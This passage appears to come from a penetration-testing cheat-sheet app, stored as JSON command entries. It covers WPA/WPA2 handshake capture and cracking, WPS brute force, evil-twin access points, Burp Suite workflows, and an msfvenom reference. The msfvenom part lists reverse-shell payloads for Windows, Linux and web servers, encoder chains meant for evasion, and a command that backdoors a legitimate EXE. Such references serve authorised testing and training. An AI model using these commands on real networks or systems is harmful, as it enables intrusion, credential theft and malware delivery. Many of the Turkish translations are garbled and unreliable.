        "name_tr": "Wireless Reconnaissance"
      },
      {
        "name": "WPA/WPA2 Attacks",
        "commands": [
          {
            "title": "Capture WPA Handshake",
            "desc": "Capture 4-way handshake from client",
            "cmd": "sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w handshake <INTERFACE>mon",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yakala: 4-way handshake client üzerinden"
          },
          {
            "title": "Deauth to Force Handshake",
            "desc": "Force client to reconnect and capture handshake",
            "cmd": "sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon",
            "tags": [
              "essential"
            ],
            "desc_tr": "Zorla: client reconnect and capture handshake'e"
          },
          {
            "title": "Crack WPA with Aircrack",
            "desc": "Crack captured WPA handshake",
            "cmd": "aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kır: captured WPA handshake"
          },
          {
            "title": "Convert to Hashcat Format",
            "desc": "Convert .cap to hashcat format (22000)",
            "cmd": "hcxpcapngtool -o hash.hc22000 handshake.cap",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dönüştür: .cap hashcat format (22000)'e"
          },
          {
            "title": "Crack WPA with Hashcat",
            "desc": "Crack WPA hash with hashcat",
            "cmd": "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kır: WPA hash hashcat ile"
          },
          {
            "title": "PMKID Attack",
            "desc": "Capture PMKID without waiting for handshake",
            "cmd": "sudo hcxdumptool -o capture.pcapng -i <INTERFACE>mon --enable_status=1",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yakala: PMKID waiting for handshake olmadan"
          },
          {
            "title": "PMKID Extract Hash",
            "desc": "Extract PMKID hash from capture",
            "cmd": "hcxpcapngtool -o pmkid.hc22000 capture.pcapng",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: PMKID hash capture üzerinden"
          }
        ],
        "name_tr": "WPA/WPA2 Attacks"
      },
      {
        "name": "WPS & Other Attacks",
        "commands": [
          {
            "title": "WPS Scan",
            "desc": "Scan for WPS-enabled networks",
            "cmd": "sudo wash -i <INTERFACE>mon",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma for WPS-enabled networks"
          },
          {
            "title": "Reaver WPS PIN Attack",
            "desc": "Brute force WPS PIN",
            "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -vv",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı WPS PIN"
          },
          {
            "title": "Reaver with Delay",
            "desc": "WPS attack with delay to avoid lockout",
            "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -d 2 -r 3:15 -vv",
            "tags": [
              "tool"
            ],
            "desc_tr": "WPS attack delay avoid lockout ile'e"
          },
          {
            "title": "Pixie Dust Attack",
            "desc": "Offline WPS attack (pixie dust)",
            "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -K 1 -vv",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Offline WPS attack (pixie dust)"
          },
          {
            "title": "Evil Twin (hostapd-wpe)",
            "desc": "Create rogue AP for credential capture",
            "cmd": "sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oluştur: rogue AP for kimlik bilgileri capture"
          },
          {
            "title": "Evil Twin (airbase-ng)",
            "desc": "Create fake AP with airbase-ng",
            "cmd": "sudo airbase-ng -e '<SSID>' -c <CHANNEL> <INTERFACE>mon",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oluştur: fake AP airbase-ng ile"
          }
        ],
        "name_tr": "WPS & Other Attacks"
      }
    ],
    "name_tr": "Kablosuz Ağ Güvenlik Testi",
    "description_tr": "WiFi security testing — WPA/WPA2 cracking, WPS attacks, evil twin, and wireless reconnaissance."
  },
  {
    "id": "burp-suite",
    "name": "Burp Suite",
    "icon": "🔶",
    "description": "Burp Suite web application security testing — proxy setup, scanning, intruder attacks, repeater usage, and common workflows.",
    "subcategories": [
      {
        "name": "Proxy Setup & Configuration",
        "commands": [
          {
            "title": "Default Proxy Listener",
            "desc": "Burp proxy listens on localhost:8080 by default",
            "cmd": "127.0.0.1:8080",
            "tags": [
              "essential"
            ],
            "note": "Configure browser/tool to use this as HTTP proxy",
            "desc_tr": "Burp vekil sunucu (proxy) listens localhost:8080 by default üzerinde"
          },
          {
            "title": "cURL Through Burp Proxy",
            "desc": "Send requests through Burp proxy using curl",
            "cmd": "curl -x http://127.0.0.1:8080 http://<TARGET_IP>/",
            "tags": [
              "essential"
            ],
            "desc_tr": "Send requests Burp vekil sunucu (proxy) curl kullanarak üzerinden"
          },
          {
            "title": "cURL Through Burp (HTTPS, Ignore Cert)",
            "desc": "Proxy HTTPS through Burp ignoring cert errors",
            "cmd": "curl -x http://127.0.0.1:8080 -k https://<TARGET_IP>/",
            "tags": [
              "essential"
            ],
            "desc_tr": "vekil sunucu (proxy) HTTPS Burp ignoring cert errors üzerinden"
          },
          {
            "title": "Python Requests Through Burp",
            "desc": "Route Python requests through Burp proxy",
            "cmd": "import requests; requests.get('http://<TARGET_IP>/', proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}, verify=False)",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: Pythrequests Burp vekil sunucu (proxy) üzerinde üzerinden"
          },
          {
            "title": "FoxyProxy Setup",
            "desc": "Configure FoxyProxy browser extension for Burp",
            "cmd": "Host: 127.0.0.1 | Port: 8080 | Type: HTTP",
            "tags": [
              "essential"
            ],
            "note": "Install FoxyProxy Standard extension, create a Burp profile",
            "desc_tr": "Yapılandır: FoxyProxy browser extensifor Burp üzerinde"
          },
          {
            "title": "Install Burp CA Certificate",
            "desc": "Download and install Burp CA cert for HTTPS interception",
            "cmd": "curl -o cacert.der http://burp/cert",
            "tags": [
              "essential"
            ],
            "note": "Browse to http://burp with proxy active, or use this curl command",
            "desc_tr": "İndir: and install Burp CA cert for HTTPS interception"
          },
          {
            "title": "SQLMap Through Burp",
            "desc": "Route SQLMap traffic through Burp for inspection",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --proxy http://127.0.0.1:8080",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: SQLMap traffic Burp for inspection üzerinden"
          },
          {
            "title": "Nikto Through Burp",
            "desc": "Route Nikto scans through Burp",
            "cmd": "nikto -h http://<TARGET_IP> -useproxy http://127.0.0.1:8080",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: Nikscans Burp'e üzerinden"
          },
          {
            "title": "Gobuster Through Burp",
            "desc": "Route Gobuster through Burp proxy",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt --proxy http://127.0.0.1:8080",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: Gobuster Burp vekil sunucu (proxy) üzerinden"
          }
        ],
        "name_tr": "Proxy Setup & Configuration"
      },
      {
        "name": "Intruder Attack Types",
        "commands": [
          {
            "title": "Sniper Attack",
            "desc": "Single payload set, one position at a time — best for individual parameter testing",
            "cmd": "Attack Type: Sniper | Positions: §param§ | Payload: wordlist",
            "tags": [
              "essential"
            ],
            "note": "Cycles through payloads one position at a time",
            "desc_tr": "Single payload set, one positiat a time — best for individual parameter testing üzerinde"
          },
          {
            "title": "Battering Ram",
            "desc": "Same payload in all positions simultaneously — for testing same value everywhere",
            "cmd": "Attack Type: Battering Ram | Positions: §user§ §pass§ | Payload: wordlist",
            "tags": [
              "essential"
            ],
            "note": "Uses same payload value in all marked positions at once",
            "desc_tr": "Same payload tüm positions simultaneously — for testing same value everywhere içinde"
          },
          {
            "title": "Pitchfork Attack",
            "desc": "Different payload lists for each position — parallel iteration",
            "cmd": "Attack Type: Pitchfork | Positions: §user§ §pass§ | Payloads: users.txt + passwords.txt",
            "tags": [
              "essential"
            ],
            "note": "Pairs line 1 of list 1 with line 1 of list 2, etc.",
            "desc_tr": "Different payload lists for each positi— parallel iteration üzerinde"
          },
          {
            "title": "Cluster Bomb Attack",
            "desc": "All combinations of payload lists — full brute force",
            "cmd": "Attack Type: Cluster Bomb | Positions: §user§ §pass§ | Payloads: users.txt × passwords.txt",
            "tags": [
              "essential"
            ],
            "note": "Tests every combination — can be slow with large lists",
            "desc_tr": "tüm combinations of payload lists — full kaba kuvvet saldırısı"
          },
          {
            "title": "Intruder Payload — Numbers",
            "desc": "Generate sequential number payloads for ID enumeration",
            "cmd": "Payload Type: Numbers | From: 1 | To: 1000 | Step: 1",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: sequential number payloads for ID listeleme"
          },
          {
            "title": "Intruder Payload — Recursive Grep",
            "desc": "Extract token from response and use in next request (CSRF bypass)",
            "cmd": "Payload Type: Recursive Grep | Grep Extract: csrf_token",
            "tags": [
              "advanced"
            ],
            "note": "Useful for brute forcing forms with anti-CSRF tokens",
            "desc_tr": "Çıkart: token response and use next request (CSRF bypass) üzerinden içinde"
          }
        ],
        "name_tr": "Intruder Attack Types"
      },
      {
        "name": "Repeater & Common Workflows",
        "commands": [
          {
            "title": "Send to Repeater",
            "desc": "Forward intercepted request to Repeater for manual testing",
            "cmd": "Right-click request > Send to Repeater (Ctrl+R)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yönlendir: intercepted request Repeater for manual testing'e"
          },
          {
            "title": "Send to Intruder",
            "desc": "Forward request to Intruder for automated attacks",
            "cmd": "Right-click request > Send to Intruder (Ctrl+I)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yönlendir: request Intruder for automated attacks'e"
          },
          {
            "title": "Copy as cURL Command",
            "desc": "Copy request as curl command for CLI usage",
            "cmd": "Right-click request > Copy as curl command",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kopyala: request as curl command for CLI usage"
          },
          {
            "title": "Match & Replace Header",
            "desc": "Auto-modify requests — e.g., add auth header to all requests",
            "cmd": "Proxy > Options > Match and Replace > Add: Header: Authorization: Bearer <TOKEN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Auto-modify requests — e.g., add auth header tüm requests'e"
          },
          {
            "title": "Response Modification",
            "desc": "Modify server responses in-transit (e.g., remove client-side validation)",
            "cmd": "Proxy > Options > Response Modification > Enable: Unhide hidden form fields",
            "tags": [
              "tool"
            ],
            "desc_tr": "Değiştir: server responses in-transit (e.g., remove client-side validation)"
          },
          {
            "title": "Engagement Tools — Discover Content",
            "desc": "Spider and discover hidden content from Target map",
            "cmd": "Target > right-click host > Engagement tools > Discover content",
            "tags": [
              "tool"
            ],
            "desc_tr": "Spider and discover gizli content Target map üzerinden"
          },
          {
            "title": "Engagement Tools — Find Comments",
            "desc": "Search for developer comments in responses",
            "cmd": "Target > right-click host > Engagement tools > Find comments",
            "tags": [
              "tool"
            ],
            "desc_tr": "Ara: for developer comments responses içinde"
          },
          {
            "title": "Save Request to File",
            "desc": "Save a request for use with sqlmap -r flag",
            "cmd": "Right-click request > Save item > request.txt",
            "tags": [
              "essential"
            ],
            "note": "Used with: sqlmap -r request.txt",
            "desc_tr": "Kaydet: a request ile kullanmak içsqlmap -r flag içinde"
          }
        ],
        "name_tr": "Repeater & Common Workflows"
      },
      {
        "name": "Scanner & Extensions",
        "commands": [
          {
            "title": "Active Scan",
            "desc": "Run active vulnerability scan on a target",
            "cmd": "Right-click target > Scan > Active scan",
            "tags": [
              "essential"
            ],
            "note": "Pro version only — tests for SQLi, XSS, SSRF etc.",
            "desc_tr": "Çalıştır: active zafiyet(ler) tarama a target üzerinde"
          },
          {
            "title": "Passive Scan",
            "desc": "Burp automatically scans all proxied traffic for issues",
            "cmd": "Dashboard > Issue activity (passive scanning is always on)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Burp automatically scans tüm proxied traffic for issues"
          },
          {
            "title": "Scan Specific Request",
            "desc": "Scan a single request for vulnerabilities",
            "cmd": "Right-click request > Do active scan",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma a single request for zafiyet(ler)"
          },
          {
            "title": "Extension — ActiveScan++",
            "desc": "Enhanced active scanning with additional checks",
            "cmd": "Extender > BApp Store > Install ActiveScan++",
            "tags": [
              "tool"
            ],
            "desc_tr": "Enhanced active tarama additional checks ile"
          },
          {
            "title": "Extension — Autorize",
            "desc": "Automatic authorization testing (IDOR detection)",
            "cmd": "Extender > BApp Store > Install Autorize",
            "tags": [
              "tool"
            ],
            "note": "Set low-privilege cookie, browse as admin — Autorize replays requests",
            "desc_tr": "Automatic authorizatitesting (IDOR detection) üzerinde"
          },
          {
            "title": "Extension — Logger++",
            "desc": "Advanced HTTP logging with search and filter",
            "cmd": "Extender > BApp Store > Install Logger++",
            "tags": [
              "tool"
            ],
            "desc_tr": "Gelişmiş HTTP logging search and filter ile"
          },
          {
            "title": "Extension — Turbo Intruder",
            "desc": "Ultra-fast intruder alternative for race conditions and mass fuzzing",
            "cmd": "Extender > BApp Store > Install Turbo Intruder",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Ultra-fast intruder alternative for race conditions and mass fuzzing/bulanıklaştırma"
          },
          {
            "title": "Extension — Param Miner",
            "desc": "Discover hidden parameters and headers",
            "cmd": "Extender > BApp Store > Install Param Miner",
            "tags": [
              "tool"
            ],
            "desc_tr": "Keşfet: gizli parameters and headers"
          },
          {
            "title": "Extension — JWT Editor",
            "desc": "Test and modify JWT tokens",
            "cmd": "Extender > BApp Store > Install JWT Editor",
            "tags": [
              "tool"
            ],
            "desc_tr": "Test et: and modify JWT tokens"
          }
        ],
        "name_tr": "Scanner & Extensions"
      },
      {
        "name": "Useful Shortcuts & Tips",
        "commands": [
          {
            "title": "Toggle Intercept",
            "desc": "Enable/disable request interception",
            "cmd": "Proxy > Intercept > Intercept is on/off",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enable/disable request interception"
          },
          {
            "title": "Forward Request",
            "desc": "Forward intercepted request to server",
            "cmd": "Ctrl+F (or click Forward)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yönlendir: intercepted request server'e"
          },
          {
            "title": "Drop Request",
            "desc": "Drop/block intercepted request",
            "cmd": "Click Drop button in Proxy tab",
            "tags": [
              "essential"
            ],
            "desc_tr": "Drop/block intercepted request"
          },
          {
            "title": "Search All Traffic",
            "desc": "Search through all captured HTTP history",
            "cmd": "Proxy > HTTP history > Filter/Search bar (Ctrl+F in table)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: tüm captured HTTP history üzerinden"
          },
          {
            "title": "Scope Filtering",
            "desc": "Limit Burp to only capture target traffic",
            "cmd": "Target > Scope > Add: .*\\.<DOMAIN>\\..*",
            "tags": [
              "essential"
            ],
            "note": "Then enable 'Show only in-scope items' in Proxy history filter",
            "desc_tr": "Sınırla: Burp only capture target traffic'e"
          },
          {
            "title": "Decoder — Base64 Decode",
            "desc": "Decode base64 strings",
            "cmd": "Decoder tab > Paste encoded string > Decode as: Base64",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çöz: zme base64 strings"
          },
          {
            "title": "Decoder — URL Encode",
            "desc": "URL-encode payloads for injection",
            "cmd": "Decoder tab > Paste payload > Encode as: URL",
            "tags": [
              "essential"
            ],
            "desc_tr": "URL-kodlama payloads for enjeksiyon"
          },
          {
            "title": "Comparer — Diff Responses",
            "desc": "Compare two responses side by side to spot differences",
            "cmd": "Right-click two responses > Send to Comparer > Words/Bytes",
            "tags": [
              "tool"
            ],
            "desc_tr": "Karşılaştır: two responses side by side spot differences'e"
          },
          {
            "title": "Disable JavaScript in Browser",
            "desc": "Bypass client-side validation by disabling JS",
            "cmd": "Proxy > Options > Response Modification > Enable: Remove all JavaScript",
            "tags": [
              "tool"
            ],
            "desc_tr": "Atla: client-side validatiby disabling JS üzerinde"
          }
        ],
        "name_tr": "Useful Shortcuts & Tips"
      }
    ],
    "name_tr": "Burp Suite",
    "description_tr": "Burp Suite web application security testing — proxy setup, scanning, intruder attacks, repeater usage, and common workflows."
  },
  {
    "id": "msfvenom-payloads",
    "name": "MSFVenom Payload Reference",
    "icon": "💉",
    "description": "Comprehensive msfvenom payload generation for various platforms, formats, and encoders.",
    "subcategories": [
      {
        "name": "Windows Payloads",
        "commands": [
          {
            "title": "Windows Reverse Shell (x64 EXE)",
            "desc": "64-bit Windows reverse shell executable",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "64-bit Windows ters bağlantı kabuğu executable"
          },
          {
            "title": "Windows Meterpreter (x64 EXE)",
            "desc": "64-bit Meterpreter reverse shell",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "64-bit Meterpreter ters bağlantı kabuğu"
          },
          {
            "title": "Windows Reverse Shell (x86 EXE)",
            "desc": "32-bit Windows reverse shell",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell32.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "32-bit Windows ters bağlantı kabuğu"
          },
          {
            "title": "Windows DLL Payload",
            "desc": "DLL reverse shell for DLL hijacking",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll",
            "tags": [
              "essential"
            ],
            "desc_tr": "DLL ters bağlantı kabuğu for DLL hijacking"
          },
          {
            "title": "Windows MSI Payload",
            "desc": "MSI installer payload (AlwaysInstallElevated)",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi",
            "tags": [
              "essential"
            ],
            "desc_tr": "MSI installer payload (AlwaysInstallElevated)"
          },
          {
            "title": "Windows Service EXE",
            "desc": "Service-compatible reverse shell for service exploitation",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o service.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "Service-compatible ters bağlantı kabuğu for service istismar"
          },
          {
            "title": "Windows PowerShell One-Liner",
            "desc": "PowerShell reverse shell as command",
            "cmd": "msfvenom -p cmd/windows/reverse_powershell LHOST=<LHOST> LPORT=<LPORT> -f raw",
            "tags": [
              "essential"
            ],
            "desc_tr": "PowerShell ters bağlantı kabuğu as command"
          },
          {
            "title": "Windows Shellcode (C)",
            "desc": "Raw shellcode in C format for custom exploits",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Raw shellcode C format for özel exploits içinde"
          },
          {
            "title": "Windows Shellcode (Python)",
            "desc": "Raw shellcode in Python format",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Raw shellcode Pythformat üzerinde içinde"
          },
          {
            "title": "Windows HTA Payload",
            "desc": "HTA file with embedded payload",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o shell.hta",
            "tags": [
              "tool"
            ],
            "desc_tr": "HTA file embedded payload ile"
          }
        ],
        "name_tr": "Windows Payloads"
      },
      {
        "name": "Linux Payloads",
        "commands": [
          {
            "title": "Linux Reverse Shell (x64 ELF)",
            "desc": "64-bit Linux reverse shell binary",
            "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf",
            "tags": [
              "essential"
            ],
            "desc_tr": "64-bit Linux ters bağlantı kabuğu binary"
          },
          {
            "title": "Linux Meterpreter (x64 ELF)",
            "desc": "64-bit Linux Meterpreter",
            "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o meterpreter.elf",
            "tags": [
              "essential"
            ],
            "desc_tr": "64-bit Linux Meterpreter"
          },
          {
            "title": "Linux Reverse Shell (x86 ELF)",
            "desc": "32-bit Linux reverse shell",
            "cmd": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell32.elf",
            "tags": [
              "tool"
            ],
            "desc_tr": "32-bit Linux ters bağlantı kabuğu"
          },
          {
            "title": "Linux Shellcode (C)",
            "desc": "Linux shellcode in C format",
            "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Linux shellcode C format içinde"
          },
          {
            "title": "Linux Bind Shell",
            "desc": "Linux bind shell (target listens)",
            "cmd": "msfvenom -p linux/x64/shell_bind_tcp LPORT=<LPORT> -f elf -o bind.elf",
            "tags": [
              "tool"
            ],
            "desc_tr": "Linux dinleyen kabuk (target listens)"
          }
        ],
        "name_tr": "Linux Payloads"
      },
      {
        "name": "Web Payloads",
        "commands": [
          {
            "title": "PHP Reverse Shell",
            "desc": "PHP reverse shell for web upload",
            "cmd": "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php",
            "tags": [
              "essential"
            ],
            "desc_tr": "PHP ters bağlantı kabuğu for web upload"
          },
          {
            "title": "PHP Meterpreter",
            "desc": "PHP Meterpreter reverse shell",
            "cmd": "msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o met.php",
            "tags": [
              "tool"
            ],
            "desc_tr": "PHP Meterpreter ters bağlantı kabuğu"
          },
          {
            "title": "JSP Reverse Shell",
            "desc": "JSP reverse shell for Java servers",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp",
            "tags": [
              "essential"
            ],
            "desc_tr": "JSP ters bağlantı kabuğu for Java servers"
          },
          {
            "title": "WAR Reverse Shell",
            "desc": "WAR file for Tomcat deployment",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war",
            "tags": [
              "essential"
            ],
            "desc_tr": "WAR file for Tomcat deployment"
          },
          {
            "title": "ASPX Reverse Shell",
            "desc": "ASPX shell for IIS servers",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx",
            "tags": [
              "essential"
            ],
            "desc_tr": "ASPX shell for IIS servers"
          },
          {
            "title": "NodeJS Reverse Shell",
            "desc": "Node.js reverse shell payload",
            "cmd": "msfvenom -p nodejs/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.js",
            "tags": [
              "tool"
            ],
            "desc_tr": "Node.js ters bağlantı kabuğu payload"
          }
        ],
        "name_tr": "Web Payloads"
      },
      {
        "name": "Encoding & Evasion",
        "commands": [
          {
            "title": "List All Encoders",
            "desc": "Show available encoders",
            "cmd": "msfvenom --list encoders",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: available encoders"
          },
          {
            "title": "List All Payloads",
            "desc": "Show all available payloads",
            "cmd": "msfvenom --list payloads",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: tüm available payloads"
          },
          {
            "title": "List All Formats",
            "desc": "Show output format options",
            "cmd": "msfvenom --list formats",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: output format options"
          },
          {
            "title": "Shikata Ga Nai Encoding",
            "desc": "Encode payload with shikata_ga_nai (x86)",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kodla: a payload shikata_ga_nai (x86) ile"
          },
          {
            "title": "Multi-Encoder Chain",
            "desc": "Chain multiple encoders for evasion",
            "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 3 -f raw | msfvenom -e x86/alpha_mixed -i 2 -f exe -o double_encoded.exe",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Chamultiple encoders for evasion içinde"
          },
          {
            "title": "Custom Payload Template",
            "desc": "Inject payload into existing legitimate EXE",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -x /path/to/legit.exe -k -f exe -o backdoor.exe",
            "tags": [
              "advanced"
            ],
            "note": "-x specifies template, -k preserves original functionality",
            "desc_tr": "Enjekte et: payload inexisting legitimate EXE'e"
          },
          {
            "title": "Bad Character Exclusion",
            "desc": "Exclude null bytes and other bad chars from payload",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\\x00\\x0a\\x0d' -f c",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Exclude null bytes and other bad chars payload üzerinden"
          }
        ],
        "name_tr": "Encoding & Evasion"
      }
    ],
    "name_tr": "MSFVenom Payload Referansı",
    "description_tr": "Comprehensive msfvenom payload generation for various platforms, formats, and encoders."
  }
];
